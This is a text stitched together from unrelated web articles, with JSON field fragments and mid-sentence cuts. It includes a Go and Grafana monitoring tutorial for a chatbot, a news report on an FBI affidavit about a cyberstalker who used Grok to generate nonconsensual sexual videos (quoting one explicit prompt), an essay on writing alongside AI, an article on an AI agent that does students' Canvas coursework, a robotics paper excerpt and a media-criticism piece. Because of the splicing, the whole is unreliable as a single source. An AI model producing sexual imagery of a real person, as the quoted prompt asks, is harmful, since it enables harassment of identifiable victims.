from\nStartTotal = promauto.NewCounterVec(\n    prometheus.CounterOpts{\n        Name: \"start_total\",\n        Help: \"Total number of /start commands by source\",\n    },\n    []string{\"source\"},  // label\n)\n\n// Errors by type — what errors and how many\nMessagesErrorsTotal = promauto.NewCounterVec(\n    prometheus.CounterOpts{\n        Name: \"errors_total\",\n        Help: \"Total number of message processing errors by type\",\n    },\n    []string{\"type\"},  // label\n)\n</code></pre><p>\\\nWhen  is pressed, we capture the source from the UTM tag (link payload):</p><pre><code>// internal/app/delivery/bot/handle_start.go\n\nsource := \"direct\"\nif payload := c.Message().Payload; payload != \"\" {\n    source = payload \n}\nmetrics.StartTotal.WithLabelValues(source).Inc()\n</code></pre><p>\\\nNow Prometheus creates separate time series: <strong>start</strong>, etc.</p><h3><strong>Histogram (How Values Are Spread)</strong></h3><p> is used to see how values are spread out. For example, LLM response times. Buckets are time ranges measured in seconds. Since an LLM in reasoning mode can take a long time, the buckets go up to 180 seconds. This way we can see how many requests fall into each time range.</p><pre><code>// internal/pkg/metrics/metrics.go\n\nLLMRequestDuration = promauto.NewHistogram(\n    prometheus.HistogramOpts{\n        Name:    \"llm_request_duration_seconds\",\n        Help:    \"Duration of LLM requests in seconds\",\n        Buckets: []float64{1, 2, 5, 10, 20, 30, 60, 120, 180},\n    },\n)\n</code></pre><p>\\\nThen we measure the LLM call duration:</p><pre><code>// internal/app/usecase/handle_message.go\n\nllmStart := time.Now()\nresponse, err := s.llmClient.Send(ctx, llmMessages, models.ThinkingLLMMode)\nmetrics.LLMRequestDuration.Observe(time.Since(llmStart).Seconds())\n</code></pre><p>Now in Grafana, we can visualize this data using percentiles.</p><p>At this point, the application writes structured logs to the console and provides metrics on a separate endpoint. Next, we need to set up the tools that collect and display this data. We add the following to , which already has settings for the application, the database, and the cron job.</p><pre><code>loki:\n  image: grafana/loki:3.0.0            # Stable Loki 3.x release\n  container_name: sex_doctor_loki\n  restart: unless-stopped               # Restart on crash, but not on manual stop\n  mem_limit: 256m                       # Strict memory limit\n  mem_reservation: 128m                 # Guaranteed minimum RAM\n  volumes:\n    - ./config/loki/loki-config.yaml:/etc/loki/local-config.yaml:ro  # Read-only config\n    - loki_data:/loki                   # Persistent volume for chunks and indexes\n  command: -config.file=/etc/loki/local-config.yaml\n  networks:\n    app_network:\n      ipv4_address: 172.25.0.10         # Fixed IP within the Docker network\n  healthcheck:                          # Grafana starts only when Loki is ready\n    test: [\"CMD-SHELL\", \"wget --no-verbose --tries=1 --spider http://localhost:3100/ready || exit 1\"]\n    interval: 30s\n    timeout: 10s\n    retries: 5\n</code></pre><p>Without <em>, Loki with default settings can grow and use up all the free memory.

This gives Promtail access to the Docker socket so it can automatically find containers and read their console output.

It combines small index files into bigger ones so that queries don't have to open hundreds of small files, and it handles retention — removing data older than the set period. We keep metrics in Prometheus for 30 days, but logs take more disk space, so 7 days is enough. The <strong>embeddedsize_mb</strong> setting makes sure that when you use Explore in Grafana and change time ranges several times, the cache makes repeated queries faster. Without it, each query reads data from disk again.</p><pre><code># config/promtail/promtail-config.yaml\n\nserver:\n  http_listen_port: 9080\n\npositions:\n  filename: /tmp/positions.yaml    # Remembers the read offset to avoid duplicate entries after restarts\n\nclients:\n  - url: http://loki:3100/loki/api/v1/push   # Where to push logs\n\nscrape_configs:\n  - job_name: docker\n    docker_sd_configs:\n      - host: unix:///var/run/docker.sock     # Discover containers via the Docker API\n        refresh_interval: 5s                  # Refresh every 5 seconds\n    relabel_configs:\n      # Container name as a label: /sex_doctor_bot → container=\"sex_doctor_bot\"\n      - source_labels: ['__meta_docker_container_name']\n        regex: '/(.*)'\n        target_label: 'container'\n      # Extract service name: /sex_doctor_bot → service=\"bot\"\n      - source_labels: ['__meta_docker_container_name']\n        regex: '/sex_doctor_(.*)'\n        target_label: 'service'\n      # Filter: collect logs ONLY from project containers\n      - source_labels: ['__meta_docker_container_name']\n        regex: '/sex_doctor_.*'\n        action: keep              # Ignore everything that doesn't match\n    pipeline_stages:\n      # Parse JSON logs from the bot\n      - match:\n          selector: '{service=\"bot\"}'      # Only for bot logs\n          stages:\n            - json:\n                expressions:\n                  level: level             # Extract the \"level\" field from JSON\n                  msg: msg\n                  time: time\n            - labels:\n                level:                     # Turn level into a Loki label\n</code></pre><p>In , we set up how Promtail connects to the Docker socket and automatically finds all the containers we need. The  section is needed so Promtail reads JSON logs and turns the level field into a label. Because of this, we can filter logs by level in Grafana.</p><p>Grafana can pick up data sources and dashboards from files at container startup. This means the configuration is stored in the repository together with the code, tracked by version control, and no extra setup through the UI is needed.</p><pre><code># config/grafana/provisioning/datasources/datasources.yaml\n\napiVersion: 1\n\ndatasources:\n  - name: Prometheus\n    type: prometheus\n    uid: prometheus\n    access: proxy           # Grafana proxies requests to Prometheus\n    url: http://prometheus:9090\n    isDefault: true         # Prometheus as the default datasource\n    editable: true\n\n  - name: Loki\n    type: loki\n    access: proxy\n    url: http://loki:3100\n    editable: true\n</code></pre><pre><code># config/grafana/provisioning/dashboards/dashboards.yaml\n\napiVersion: 1\n\nproviders:\n  - name: 'default'\n    orgId: 1\n    folder: ''\n    type: file\n    disableDeletion: false\n    updateIntervalSeconds: 10          # Check for updates every 10 seconds\n    options:\n      path: /var/lib/grafana/dashboards   # Path to dashboard JSON files inside the container\n</code></pre><p>Dashboards are stored in <strong>config/grafana/dashboards/</strong> as JSON files and are loaded into the container:</p><pre><code>config/grafana/\n├── dashboards/\n│   ├── bot-overview.json       # Overview: new users, active users, errors\n│   ├── engagement.json         # User engagement and retention\n│   └── llm-performance.json    # LLM response times\n└── provisioning/\n    ├── datasources/\n    │   └── datasources.yaml    # Prometheus + Loki\n    └── dashboards/\n        └── dashboards.yaml     # Path to JSON files\n</code></pre><p>Upon deployment, the Grafana instance reads the provisioning files, connects Prometheus and Loki as data sources, and loads three dashboards. How to configure the UI via JSON files is covered below.</p><h2>Logs and Metrics via Explore</h2><p>To check that everything we set up above is working, we can use the  section. It works as a playground for running manual queries against Loki and Prometheus.</p><p>Open Explore, select the  datasource, filter by container , and you'll see all application logs for the selected time range.</p><p>Loki is working, JSON logs are parsed, and we can filter by  — for example, to see only errors.</p><h3>Verifying Metrics via Prometheus</h3><p>Switch the datasource to  and select the  metric for new users, filtered by container.</p><p>Something is clearly wrong. A Counter in Prometheus is a value that only goes up. The graph looks like a staircase: each  adds +1, and the number never goes down. What we actually want to see is not the running total but how many events happened in each time period. Also,  is meant for debugging. Our real goal was to show metrics as clean, ready-made dashboards without needing to write any queries by hand in Grafana.</p><h2>Building Dashboards in Grafana</h2><p>This is what the product manager sees when they open Grafana. Three rows of  panels: for 24 hours, 7 days, and 30 days. The  panel in Grafana visualizes a single specific value with optional sparklines and thresholds. Each row has four metrics: new users, active users, errors, and average LLM response time.</p><p>Below the  panels are  tables for 24h, 7d, and 30d. Below that is a  panel showing  commands by source over time. A  panel in Grafana draws a graph based on time.</p><p>The second dashboard is made for a deeper look at the data. It includes retention by day (whether a user came back on the first, second, or third day after using the bot), a first-day activity funnel (sent one message, more than two, more than five), and average message count. The activity funnel uses a  — a panel with horizontal bars. Each bar shows a value and fills up with color based on its size (like a progress bar).</p><p>All dashboards are stored as JSON files in <strong>config/grafana/dashboards/</strong> and are loaded automatically when the Grafana instance is deployed.</p><h3>JSON Dashboard configuration</h3><p>A dashboard in Grafana is configured via a JSON file. You can build it in the UI and export it, or write it by hand. Let's look at the structure using  as an example.</p><p>The top level contains dashboard metadata:</p><pre><code>{\n  \"uid\": \"bot-overview\",\n  \"title\": \"Bot Overview\",\n  \"tags\": [\"bot\"],\n  \"refresh\": \"30s\",\n  \"time\": { \"from\": \"now-24h\", \"to\": \"now\" },\n  \"panels\": [ ... ]\n}\n</code></pre><p> — the dashboard auto-refreshes every 30 seconds.  — the default time range. Panel configurations are defined in the  array.</p><p>A dashboard is a grid  wide. Each panel takes up a rectangle set by :</p><pre><code>\"gridPos\": { \"h\": 4, \"w\": 6, \"x\": 0, \"y\": 0 }\n</code></pre><p>Where  is width (out of 24 columns),  is height (in relative units),  is offset from the left, and  is vertical position.</p><p>Here is how a single Stat panel is structured:</p><pre><code>{\n  \"title\": \"New Users (24h)\",\n  \"type\": \"stat\",\n  \"gridPos\": { \"h\": 4, \"w\": 6, \"x\": 0, \"y\": 0 },\n  \"datasource\": { \"type\": \"prometheus\", \"uid\": \"prometheus\" },\n  \"targets\": [\n    {\n      \"expr\": \"round(increase(new_users_total[24h]))\",\n      \"legendFormat\": \"New\"\n    }\n  ],\n  \"fieldConfig\": {\n    \"defaults\": {\n      \"thresholds\": {\n        \"steps\": [\n          { \"color\": \"blue\", \"value\": null },\n          { \"color\": \"green\", \"value\": 10 }\n        ]\n      },\n      \"decimals\": 0\n    }\n  },\n  \"options\": {\n    \"colorMode\": \"background\",\n    \"graphMode\": \"area\"\n  }\n}\n</code></pre><p> — shows a big number.  — the PromQL query.  calculates how much the counter grew over the  window (how many new users in 24 hours).  rounds the result to a whole number.  — color rules: below ten is blue, ten or above is green.  fills the whole panel background, not just the number.  adds a small area chart behind the number, showing the trend over the chosen time range.</p><h2>The Problem With New Labels and Its Solution</h2><p>After deploying new functionality, I noticed that when a metric shows up for the first time, it shows 0 instead of 1. This is especially easy to see in Time Series panels.</p><pre><code>{\n  \"expr\": \"round(increase(start_total[$__interval]))\", \n  \"legendFormat\": \"{{source}}\",\n  \"interval\": \"1m\"\n}\n</code></pre><p>The problem is that  needs at least two data points inside the window to calculate the difference. When a label first shows up in a , there are no earlier data points. There is nothing to compare with, so  returns 0.</p><p>If you call  (without .) at application startup, Prometheus will start scraping that time series immediately with a value of 0. We add an initialization function and call it in :</p><pre><code>// metrics.go\nfunc Init() {\n    // /start direct\n    StartTotal.WithLabelValues(\"direct\")\n\n    // other metrics\n    ...\n}\n\n// main.go\nmetrics.Init()\n</code></pre><h3>What This Approach Does Not Solve</h3><p> is a metric where source comes from the  command data. Dynamic labels cannot be set up ahead of time, which means that for each new label value, the first  will show 0 instead of 1. One way to fix this would be to keep a list of known source values and set them up in main before they are used. Together with the product manager, we decided that being off by one user per new source is good enough for our needs.</p><p>The goal was to build a handy monitoring setup for both a developer and a product manager, with little time and limited memory. Here is what we did:</p><ul><li>The technology stack <strong>Prometheus + Loki + Promtail + Grafana</strong> was chosen and fit within 1 GB of RAM. The Out-Of-Memory killer has never been triggered.</li><li>Added structured logs to the application code, along with event counters split by category, histograms that group values into time ranges, and a separate HTTP server that provides metrics using the pull approach.</li><li>Added Docker Compose settings for deployment. Prometheus and Loki are not open to the outside. Grafana dashboards are kept in the repository. Grafana has brute-force protection turned on and user sign-ups turned off.</li><li>Three dashboards were built, displaying error counts over time, LLM response times, and user engagement and retention.</li><li>Found problems with how labels show up on dashboards. Fixed it for static labels, and agreed with the product manager on how to handle dynamic labels.</li></ul><p>Whether you found this helpful or have questions, I'm always happy to chat.

Tuck regularly worked out with and texted with the woman and, according to the affidavit, secretly filmed her while she was working out in his garage. Over the course of the last several months, Tuck swatted their home, made a series of anonymous reports to the man’s employer claiming that he was a child abuser and a drug addict, posed as the man and made a series of mass shooting and suicide threats. Tuck also made a series of other threats and bizarre actions, which included reaching out to a funeral home to say that the man would be dead soon and sending threats to the man while posing as a member of Sector 16, a Russian hacking crew.</p><p>The affidavit notes that, in January, the FBI got a search warrant for the man’s conversations with Grok. The FBI says that it received “prompts provided to GrokAI that generated approximately 200 pornographic videos of a woman who closely resembled VICTIM’s wife’s physical appearance.”</p><p>“For example, in one prompt, TUCK queried: ‘In a sensual sports style, a confident blonde woman playfully undresses on a tennis court, starting with her white crop top pulled up to expose her bare breasts. She has long wavy hair, a toned athletic body, and a flirtatious smile, wearing a short navy pleated skirt and holding a racket. She slowly lowers her top, revealing full nudity, tosses her hair, and swings the racket teasingly, with a surprising clumsy spin like a comedic twirl,’” the affidavit says.&nbsp;</p><p>The FBI says that Tuck also allegedly used Grok to create a complaint about the woman’s husband that was then filed to the company he works for.&nbsp;</p><p>The actions described in the affidavit are extreme and horrifying, but are not terribly out of the ordinary for harassment cases that we have reported on before. What’s notable here is that this case shows that law enforcement is looking at chats with AI bots as potential sources of evidence and that X is complying with these requests. </p><p>Most importantly, it highlights X’s role in allowing Grok to create nonconsensual sexual material in a criminal case that involves extreme cyberstalking and real life harm. According to the affidavit, Tuck used Grok to create this nonconsensual sexual material at the same time that Grok was being heavily <a href=\"https://www.404media.co/groks-ai-csam-shitshow/\"><u>criticized for creating child sexual abuse material</u></a>. This all happened during the “undress her” phenomenon, which showed just how terribly Grok’s content moderation is. Last week, we also reported that Grok was used to <a href=\"https://www.404media.co/grok-doxing-real-names-birthdates-siri-dahl/\"><u>reveal the real name of an adult performer</u></a>.</p><p><em>Correction: This piece originally said the FBI issued Grok with a subpoena. It was a search warrant.</em></p>",

      "content": "<p>We’ve spent long enough on the internet to watch the web reinvent itself—twice before breakfast on some days. We’ve seen users chase SEO fads, social algorithms, video pivots, and now we’re staring down a world where machines can spit out a passable first draft before we’ve even finished our coffee.</p><p>In a world where machines can churn out articles at scale, it’s easy to wonder what’s the point of adding your voice when a model can draft the same thing in seconds.</p><p>But that’s the wrong question. What you should really be asking is: how do I write in a way that no model—or no copycat—can replicate?</p><p>This piece is about that distinction—how to stay unmistakably you while writing in a world that’s happily automated the boring parts. Because you’re not competing against a model, you’re competing against other humans who know how to use models without letting models use them.</p><h2><strong>What Machines Can’t Steal</strong></h2><p>The internet doesn’t reward sameness for long. It rewards taste, reporting, and point of view—the three things AI can’t credibly fake at scale.</p><ul><li><p> is your internal compass: what you choose  to cover, which details you elevate, the angle you find obvious that others miss. Taste comes from what you read, watch, and play; it’s a fingerprint.</p></li><li><p> is friction. It’s the DM you send, the call you place, the dataset you scrape, the test you run. When you , your copy becomes unfakeable.</p></li><li><p> is responsibility. You’re not summarizing—anyone can. You’re  for readers who don’t have the time or context.</p></li></ul><p>AI can remix the internet; it can’t create new facts, fresh interviews, or your lived take. That’s your moat.</p><h2><strong>How to Stay Original on Purpose</strong></h2><blockquote><p><em>“Originality isn’t about being clever. It’s about being deliberate.” — unknown</em></p></blockquote><p>Authors often think originality means coming up with never-before-seen ideas or reinventing the wheel on every assignment. But that’s not true: you don’t stumble into originality—you build it into your process. You make conscious choices, again and again, that pull your work away from the generic and toward the distinct. \\n </p><p>Here are some tips on how you can build originality in your own work:</p><p>Before you write, sketch the skeleton of your story: what happened, why it matters, who’s affected, what’s new, what’s next. This spine keeps you honest. If a paragraph doesn’t connect back, cut it. Writers who skip this step end up with a copy that feels hollow.</p><p>If you’re just restating what’s already public, you’re competing with machines—and losing. Add friction: test the product, call the source, compare claims to filings. Even a small act of reporting makes your story impossible to duplicate.</p><h3><strong>3. Use AI, Don’t Let It Use You</strong></h3><p>Treat AI like a spell-checker with benefits. It’s fine for brainstorming headlines, summarizing background docs, or pressure-testing your outline. But never let it write your lead or quotes. That’s where your story’s soul lives. Once you give that away, you’re just another remix.</p><p>Look at your draft. If every sentence leans on “is,” “was,” or “are,” your writing will feel lifeless. Strong verbs do the heavy lifting. <em>“Microsoft slashed prices”</em> is better than <em>“Prices were cut by Microsoft.”</em> An active voice makes your perspective felt.</p><h3><strong>5. Write to Someone You Know</strong></h3><p>Forget the vague “audience.” Picture a friend, a sibling, someone real. Write like you’re explaining it to them. The sharper your imagined reader, the clearer your voice will be.</p><p>If your first line starts with “In today’s fast-paced world…” stop. Open with an image, a moment, or a telling detail. The couch that ate your robot vacuum. The mom whose accent Siri finally understood. Specifics create trust.</p><p>A good quote does one of three jobs: lends authority, shows conflict, or adds color. If your quote just repeats what you already wrote, cut it. Don’t pad your work with “he said, she said.”</p><p>Yes, SEO matters. But don’t sell your soul to it. Write for humans first, then make sure your keywords are clear and natural. A good headline isn’t just findable—it’s memorable. <em>“Steam’s refund tweak just killed impulse buys”</em> beats <em>“Steam announces new refund policy.”</em></p><p>You will produce many drafts that feel replaceable. Don’t panic. Voice is a volume knob, not a light switch. Reporting is a habit, not a hero moment. Taste is a garden, not a gift—you tend it by feeding it well.</p><p>Use AI to widen your field of view, not to narrow your signature. Automate the chores so you can spend time on the parts only you can do: asking better questions, noticing the telling detail, and choosing the angle that makes a reader text someone and say, “you have to see this.”</p><p>There’s one more responsibility you carry as a writer: transparency. If you use AI in your process, know where the line is. Don’t generate quotes. Don’t slip in “facts” you haven’t verified. If you touch meaning—images, transcripts, conclusions—label it.&nbsp;</p><p>\\n Readers can forgive rough edges; they won’t forgive being misled.</p><p>\\\n<strong>Taking in all of this at once might seem a bit overwhelming. The good news is that you don’t have to.</strong></p><p>\\\n<strong>The <a href=\"https://courses.hackernoon.com/\">HackerNoon Blogging Course</a> with its self-paced structure, on-demand video lessons, practical tools and templates (yours to keep), exercises, and a community to learn with, allows you to digest all the resources you need to grow your reach and authority as a writer.

In the app, after entering your destination, Uber Air will appear as an option for eligible routes. The Uber app will book a flight and an Uber Black to pick you up and drop you off at a Joby \"vertiport.\" Joby's air taxis, built exclusively for city travel, can accommodate up to four passengers and luggage. (Uber says size and weight guidelines will be announced closer to launch.) The interior is about the size of an SUV and has \"comfortable seating\" with panoramic windows. They can travel up to 200 mph and have a range of up to 100 miles. Four battery packs and a triple-redundant flight computer are onboard for safety purposes.",

For Advait Paliwal, Brown dropout and co-creator of Einstein, there isn’t one. “I think about horses,” he said. “They used to pull carriages, but when cars came around, I'd argue horses became a lot more free,” he said. “They can do whatever they want now. It would be weird if horses revolted and said ‘no, I want to pull carriages, this is my purpose in life.’”</p><p>But humans aren’t horses. “This is much bigger than Einstein,” Matthew Kirschenbaum told 404 Media. “Einstein is symptomatic. I doubt we’ll be talking about Einstein, as such, in a year. But it’s symptomatic of what’s about to descend on higher ed and secondary ed as well.”</p><p>Kirschenbaum teaches English at the University of Virginia and has <a href=\"https://www.theatlantic.com/technology/archive/2023/03/ai-chatgpt-writing-language-models/673318/?ref=404media.co\"></a> about artificial intelligence. He’s also a member of the Modern Language Association (MLA) where he serves as member of its Task Force on AI Research and Teaching. Einstein isn’t the first agentic AI to do the work of a student for them, it’s just one that got attention online recently. Kirschenbaum and his fellow committee members <a href=\"https://www.mla.org/Resources/Advocacy/Executive-Council-Actions/2025/Statement-on-Educational-Technologies-and-AI-Agents?ref=404media.co\"></a> about these AIs in October, 2025.</p><p>“Agentic browsers are becoming widely available to the public. These offer AI ‘agents’ that can navigate [learning management systems] and complete assignments without any student involvement,” the MLA’s statement from October said. “The recent and hasty integration of generative AI features into those systems is already redefining student and instructor relationships, evaluative standards, and instructional outcomes—with no compelling evidence that any of it is for the better.”</p><p>The statement called on educators, lawmakers, and learning management system providers like Canvas, too cooperate in order to give academic institutions the abilities to block AI agents like Einstein.&nbsp;</p><p>Canvas did not respond to a request for comment.&nbsp;</p><p>Einstein is explicit in its pitch: it will log into Canvas (one of the most popular and ubiquitous pieces of education software) and do your classwork for you, just like Kirschenbaum and his fellows warned about last year.</p><p>The attractiveness of agentic AIs is a symptom of a decades-long trend in higher education.&nbsp; “Universities…by and large adopted a transactive model of education,” Kirschenbaum said. “Students see their diploma as a credential. They pay tuition and at the end of four years, sometimes five years, they receive the credential and, in theory at least, that is then the springboard to economic stability and prosperity.”</p><p>Paliwal seems to agree. He told 404 Media that he attempted to change the university from the inside while working as a TA, but felt stymied by politics. “The only way to force these institutions to evolve is to bring reality to their face. And usually the loudest critics are the ones who can't do their own job well and live in fear of automation,” he said.</p><p>For Paliwal, agentic AIs are a method of freeing people from the labor of education. “I think we really need to question what learning even is and whether traditional educational institutions are actually helping or harming us,” he said. “We're seeing a rise in unemployment across degree holders because of AI, and that makes me question whether this is really what humans are born to do. We've been brainwashed as a society into valuing ourselves by the output of our productive work, and I think humanity is a lot more beautiful than that. Is it really education if we're just memorizing things to perform a task well?”</p><p>Kirschenbaum said that programs like Einstein are the inevitable conclusion of viewing higher education as a certification and transactive process. “What we’re finding is that if forms of education can be transacted then we’ve just about arrived at the point where autonomous software AI agents are capable of performing the transaction on your behalf,” he said. “And so the whole educational paradigm has come back to essentially bite itself in the ass.”</p><p>He said that one solution he’s seen work is to retreat from devices entirely in the classroom. “Colleagues who have done it report that students are almost universally grateful. They understand the reasoning. They understand the logic,” he said. “And they appreciate the opportunity to be freed from the phones and the screens and to focus and engage with other people in a meaningful dialogue.”</p><p>But the abandonment of EdTech platforms and screens won’t work for every student. Anna Mills, an English professor at the College of Marin and a colleague of Kirschenbaum’s on the MLA AI task force, compared the fight against agentic AI in education to cybersecurity. “We could decide that bots need to be labeled as bots and that we need to be able to distinguish human activity from AI activity online in some circumstances and that we want to build infrastructure for that,” she said. “That would be an ongoing project, as cybersecurity is.”</p><p>Mills is not a luddite. She’s an expert in artificial intelligence systems as well as English, frequently uses Claude, and has been documenting the rise of agentic AIs in EdTech on her <a href=\"https://www.youtube.com/@annamills1707?ref=404media.co\"><u>YouTube channel for months</u></a>. She said that using agentic AI like Einstein was cheating, full stop, and academic fraud. “This is in direct violation of these foundational agreements that we make in order to use technology for human communication, human exchange, and human work online,” she said. “And yet that’s not obvious to us. It seems like it’s just another tool, right? But it’s not.”</p><p>Mills said she understands Paliwal’s frustrations with education. “But what you need to understand is that online learning spaces are critical for students to access any kind of education,” she said. For her, the proliferation of tools like Einstein do more than help a student bypass the labor of the classroom. They poison the educational well. Online learning has been a boon to many kinds of non-traditional students and that the rise of agentic AI is a threat to that not just because it trivializes traditional forms of education, but because it hurts the credibility of EdTech itself and other online platforms.</p><p>The vast majority of college students aren’t attending Ivy League schools, they’re grinding away at night classes in community colleges across the country. Distance and online learning has been an enormous boon for those students. “If there’s no credibility to that, then you’ve just ruined the investment and the learning goals and the access to meaningful learning that that they can then also use for employment of students who are underprivileged, who can’t come to the classroom, who are working full time and raising families and trying to get an education,” Mills said.</p><p>Students aren’t horses and there is no greater freedom they can buy themselves by using AI tools to cheat in the classroom. And worse, the more these tools proliferate, the more suspect the entire enterprise becomes. It’s one thing to cheat yourself out of an education, it’s quite another to muddy the waters of EdTech platforms and online learning for everyone else.</p>",

      "content": "<p>We evaluate LEGS through a series of open-vocabulary object recall tasks. These tasks are designed to measure the system’s competency in capturing and organizing information based on both location and semantic meaning. We evaluate LEGS on four large-scale indoor environments, two office kitchen scenes containing different objects, an office workspace, and a grocery store testbed [15] as seen in Figure 3. For the grocery store testbed, data is collected with the TTT robot [15]. The robot begins in a previously</p><p>Fig. 4: Single Camera Reconstruction Comparison Results. We compare the quality of Gaussian splats on an Intel Realsense D435, Intel Realsense D455, and Stereolabs Zed 2 with and without bundle adjustment. For each configuration we present two views: one of the Gaussian splat facing the kitchen island head-on and another view at an angle.</p><p>\\\nunseen environment and is manually pushed around a preplanned path (including straight lines, loops, figure-8, etc) while continuously registering new images until it finishes the path. The robot will actuate its torso height to obtain multiple azimuthal perspectives from the same position on subsequent passes. Every 150 keyframes, we perform global bundle adjustment on all previous poses in DROID-SLAM and update accordingly in our 3D Gaussian map. Our system uses 2 NVIDIA 4090s, one for training LEGS, which takes 15 GB of memory and the other for DROID-SLAM, which can take up to 18 GB of memory.</p><p>\\\nThe evaluation approach was adopted from previous 3D language mapping works [1], [55]. We randomly sample images from our training set and query Chat-GPT 4V with: “name an object in this scene in 3 words or fewer”. This process is repeated until 15 unique queries are generated for each of the four scenes. We then choose a random novel view and manually annotate a 2D bounding box around each selected object of interest. Then, we query LEGS on each object and identify the highest activation energy point, and project that point in the novel 2D view. If the projected point is contained in the bounding box, we consider the query successful. Additionally, we directly baseline our approach by running LERF [1] to compare the object recall capabilities for a large-scale scene in radiance field methods.</p><p>\\\nThe results in Table 1 suggest that LERF and LEGS have similar language capabilities, recalling roughly the same number of objects per scene. However, to achieve the same visual quality, LERF takes an average time of 44 minutes to train while LEGS only takes 12 minutes. Figure</p><p>shows examples of successful object localization queries. Localization may fail when objects are not seen well in the training views or have similar color to their background, as shown in Figure</p><p><em>B. Reconstruction quality comparison</em></p><p>We study how camera configuration and bundle adjustment (BA) affect the quality of the LEGS Gaussian splat as summarized in Figure 4 and Table 2. With respect to the camera configuration ablation, we evaluated different depth and stereo cameras including the Realsense D435, Realsense D455, and Zed 2. For each camera configuration, we also run a BA ablation where we either run bundle adjustment at the end of the traversal or not at all.</p><p>\\\n<strong>Global Bundle Adjustment:</strong> Table II suggests bundle adjustment improves Gaussian Splat quality for all camera configurations, removing ghostly duplicate artifacts. This is especially true for the Realsense D455 and Zed 2 cameras where the bundle adjustment configurations yielded nearphotorealistic views of the scene whereas without bundle adjustment, both configurations have significantly more Gaussian floaters and/or offset objects (i.e. the left image in Figure 4 part (e) has two volleyballs). The Realsense D435 performs slightly better with bundle adjustment, but neither D435 configuration yield high quality largely due to the camera’s low FOV resulting in worse localization. We also compared a single Zed 2 camera to a multi-camera setup where the D455 Realsense is front-facing and 2 Zed cameras face the left and right side. Both gaussian splats perform well and properly render objects that were well viewed in the traversal (“raccoon toy” and “first aid kit”) as seen in Figure 7. However, none of the cameras were pointing toward the ground leading to sparse views of objects near the floor. Because the multi-camera setup captures more views of the scene, it is able to construct a Gaussian splat that is better able to render these low-view objects such as the trash chutes and wet floor sign.</p><ol><li>Thomas Kollar&nbsp;Ken Goldberg</li></ol><p>:::info\nThis paper is  under CC by 4.0 Deed (Attribution 4.0 International) license.</p>",

Yet again, AOC saying “um” a few times became a huge news cycle by a press owned by people who are <em>personally financially invested</em> in AOC not becoming Senate Minority/Majority leader or President:</p><p>As is often the case, a lot of this non-story news cycle was started by Conservative media, which has come to dominate much of AM radio, traditional papers (WSJ, NY Post, WAPO), broadcast television (Sinclair, Nexstar, Tegna), cable news (Fox, OAN, Newsmax), and now the internet. And, as <a href=\"https://spinclass.substack.com/p/spin-class-case-study-i-caught-politico?utm_source=substack&amp;utm_medium=email\">Emily Horne notes</a>, a big player in the the AOC um news cycle was so-called “pink slime” newspapers.</p><p>“Pink slime” newspapers are fake local news papers built by local partisan operatives (almost always right wing) to seed misinformation and propaganda in the minds of poorly educated and already misinformed local voters. &nbsp;The total of such fake newspapers has tripled since 2019, and now&nbsp;<a href=\"https://arstechnica.com/tech-policy/2024/04/pink-slime-local-news-outlets-erupt-all-over-us-during-election-year/\">roughly equals the number of real journalism organizations in America</a>.</p><p>Horne noticed how major outlets like the New York Times and Politico linked out to several of these fake papers during the non-news cycle, helping amplify right wing propaganda. At several points they link out to a “newspaper” dubbed The Midwesterner, which isn’t a newspaper at all. It’s a right wing propaganda op run by Republicans to pee in the discourse pool:</p><blockquote><p><em>“<a href=\"https://www.themidwesterner.news/\">The Midwesterner</a>&nbsp;purports to be a Michigan local news outlet. Per the&nbsp;<a href=\"https://web.archive.org/web/20230204194041/https://www.themidwesterner.news/\">Wayback Machine</a>, the Midwesterner first appeared on February 4, 2023. It appears to have appeared online fully formed, with no announcement or notice. There’s no masthead, About section, or way to contact reporters. There are no ads, paywalls, or paid subscription options.”</em></p></blockquote><p>Outlets like New York Times and Politico linked to the fake propaganda websites as serious examples of the kind of “criticism” AOC and other Democrats have to account for. But Horne discovered the dodgy nature of these outlets with just a little research:</p><blockquote><p><em>“The main takeaway here:&nbsp;<strong>it’s clear that the Midwesterner isn’t a real media outlet, it’s a right-wing political content mill—which the&nbsp;New York Times&nbsp;and POLITICO both failed to note when they cited its viral tweet as the kind of foreign policy criticism that Democrats just need to face.</strong></em></p><p><em>The leading political news outlets of our time should not be sourcing their reporting from scammy, obviously partisan websites with no mastheads. They shouldn’t be linking to their content without explaining who it’s from and what it’s about. But it appears they either didn’t know what they were citing, or didn’t care to find out.”</em></p></blockquote><p>I’d recommend <a href=\"https://spinclass.substack.com/p/spin-class-case-study-i-caught-politico?utm_source=substack&amp;utm_medium=email\">reading the whole thing</a> in which she figures out who is secretly behind the Midwesterner (you guessed it, a top right wing political operative, not that that’s ever disclosed).</p><p>Mainstream outlets have been gamed by charlatans so consistently, we’re well past the point where they deserve any benefit of the doubt. While these outlets may still be peppered with some decent reporters, by and large they generally serve the extraction class. It’s not subtle. And the rise of fascism has made it less subtle than ever. Give your money, where possible, to reputable independent outlets and reporters. </p>",

      "content": "<p><em>Digital businesses are challenged by modern users more than ever. Their ability to remain competitive, retain their loyal customers, and attract new ones heavily depends on how fast they can release new features and respond to constantly shifting demands. In their strive to accomplish this goal, more and more companies try to bridge the gap between development and QA by bringing aboard experts with a rare mix of qualifications.</em></p><p><em>Today, we invited Iuliia Kozlova, one of the first Kubestronauts in Russia, to share her story of becoming a leading QA and DevOps expert. You will learn what sets an expert apart from an engineer, where to start if you want to work on building products used by millions of people, how professional certification can contribute to your career, and other ways to make a name for yourself in the industry.</em></p><p>\\\n<strong>Welcome, Iuliia! In the Commonwealth of Independent States, you are known as one of the top QA/DevOps specialists in the IT industry, involved in national‑level projects, and also as one of only three people in Russia to hold the prestigious Kubestronaut status. Could you tell our readers how you managed to achieve such recognition in the industry?</strong></p><p>A good example is the Zvuk project. Zvuk is a global streaming service whose development requires new solutions and exceptional skills. Thanks to my work at the intersection of DevOps and QA we didn’t have to choose between release velocity and quality and were able to significantly reduce the product’s time‑to‑market without degrading the user experience, which gave us a competitive advantage. Working on such multi‑layered projects requires paying attention to quality metrics not only for individual services, but for the entire system as a whole as well. This is where my previous experience on large‑scale projects such as Rutube and Sber played a pivotal role. And my high level of expertise in what seem like completely different roles made my presence uniquely important for the project, since these positions imply different toolchains and skill sets, which are very rarely seen in a single specialist. The value of such employees is especially high now that there is a mass outflow of highly qualified specialists.</p><p>\\\n<strong>What impact did working on such projects have on your visibility? How did you notice it increasing?</strong></p><p>It was precisely thanks to my visibility in the industry and my certification achievements that I received a number of attractive offers - both job offers and invitations to evaluate others’ work. For example, in 2024 I was invited to be on the jury of a hackathon dedicated to developing an AI agent that could provide psychological support, and another competition focused on algorithmic programming. This month, another event is planned where I will participate as a judge - a 